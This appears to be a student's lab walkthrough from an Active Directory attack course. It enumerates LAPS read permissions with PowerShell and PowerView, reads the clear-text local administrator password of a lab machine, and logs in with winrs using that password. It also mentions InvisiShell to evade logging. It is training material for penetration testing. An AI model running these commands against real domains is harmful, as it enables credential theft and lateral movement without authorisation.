
Task 
• Identify OUs where LAPS is in use and user(s) who have permission to read passwords. 
• Abuse the permissions to get the clear text password(s).



First, we need to find the OUs where LAPS is in use. We can enumerate this using the ActiveDirectory module and LAPS module. Let's use Get-LAPSPermissions.ps1 PowerShell script for that. Remember that we continue to use InvisiShell to run PowerShell tools:

```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```


```
C:\AD\Tools\Get-LapsPermissions.ps1
```

![[Pasted image 20250316125839.png]]

We also use PowerView for this enumeration:

```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

![[Pasted image 20250316130156.png]]

So, the studentusers group can read password for LAPS managed Administrator on the us-mgmt machine. Let's try it using the Active Directory module, LAPS module and PowerView.

Active Directory module 

```
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

LAPS module

```
 Get-AdmPwdPassword -ComputerName us-mailmgmt
```

Powerview

```
 Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```

Let's try to access the mail-mgmt machine with this password by using winrs. Success means administrative access:

```
winrs -r:us-mailmgmt -u:.\administrator -p:x90yXSRFT.mqZC cmd
```

![[Pasted image 20250316130907.png]]

We can also use a PSRemoting session:

![[Pasted image 20250316131154.png]]

